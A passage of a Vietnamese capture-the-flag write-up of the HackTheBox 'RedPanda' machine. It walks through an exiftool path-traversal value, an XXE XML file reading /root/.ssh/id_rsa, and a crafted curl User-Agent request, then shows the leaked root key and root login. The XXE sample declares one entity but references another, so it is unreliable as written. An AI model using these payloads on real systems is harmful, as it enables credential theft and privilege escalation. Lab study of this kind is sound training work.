woodenk@redpanda:~$ 
```

*App.java*:

```python
...
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }
...
```

Trong file này tôi nhận ra đoạn code này được dùng để phân tích file ảnh bằng phương thức metadata và đọc trường "Artist" để in ra xml path `"/credits/" + artist + "_creds.xml"`, vậy nên tôi sẽ thay đổi trường "Artist" trong file ảnh bất kỳ thành địa chỉ nơi mà tôi sẽ đặt file xml. 

Và để không lặp lại sai lầm như phía trên là thực thi trên thư mục không có quyền Write thì tôi sẽ trỏ xml vào thư mục của user *woodenk*

Đầu tiên tải 1 chiếc ảnh về và thay đổi trường "Artist" của nó

```python
┌──(neo㉿kali)-[~]
└─$ exiftool -Artist="../home/woodenk/privesc" user.jpg
    1 image files updated
                                          
┌──(neo㉿kali)-[~]
└─$ scp user.jpg woodenk@10.10.11.170:.
woodenk@10.10.11.170's password: 
user.jpg                                                   100%   13KB 185.9KB/s   00:00  
```

Sau đó tôi tạo 1 file xml sử dụng [XML Entity Expansion in Java](https://knowledge-base.secureflag.com/vulnerabilities/xml_injection/xml_entity_expansion_java.html#vulnerable-example-1) để đọc ssh private key của user *root*. Và như ở trên tôi để đường dẫn đến `privesc` thì với quy ước đặt tên `"/credits/" + artist + "_creds.xml"` tôi sẽ phải đặt tên file xml này là `privesc_creds.xml`

```python
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>    
  <author>damian</author>
  <image>    
    <uri>/../../../../../../../home/woodenk/user.jpg</uri>
    <views>1</views>
    <foo>&xxe;</foo>
  </image>   
  <totalviews>2</totalviews>
</credits>
```

Cũng với file *App.java*, tôi nhận thấy cách User-Agent được xử lý:

```python
 public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        
        return map;
    }
```

Tôi sẽ sử dụng 1 lệnh `curl` để gửi 1 request lên server với User-Agent đã được sửa đổi thành đường dẫn đến ảnh tôi đã lên phía trên. Và khi nó thực thi, nó sẽ trả về cho tôi private key của user *root*

```python
┌──(neo㉿kali)-[~]
└─$ curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/user.jpg"
```

Chờ 1 chút để server xử lý và mở lại file xml vừa tạo.

```python
woodenk@redpanda:~$ cat privesc_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/user.jpg</uri>
    <views>3</views>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
  </image>
  <totalviews>4</totalviews>
</credits>
woodenk@redpanda:~$ 
```

Lưu private key này về và login ssh

```python
┌──(neo㉿kali)-[~]
└─$ ssh -i id_rsa root@10.10.11.170                                       
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 03 Nov 2022 03:19:59 AM UTC

  System load:           0.0
  Usage of /:            82.9% of 4.30GB
  Memory usage:          59%
  Swap usage:            0%
  Processes:             226
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c2da


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Nov  2 13:54:23 2022 from 10.10.14.15
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)
root@redpanda:~# ls
root.txt 
root@redpanda:~# 
```

Đây là 1 bài tuy là mức easy nhưng cũng cần khá nhiều kỹ năng, đặc biệt là hiểu và viết payload cũng như phân tích code java. Tôi tham khảo writeup ở [đây](https://shakuganz.com/2022/07/12/hackthebox-redpanda/). Nó giải thích khá chi tiết và khá dễ hiểu.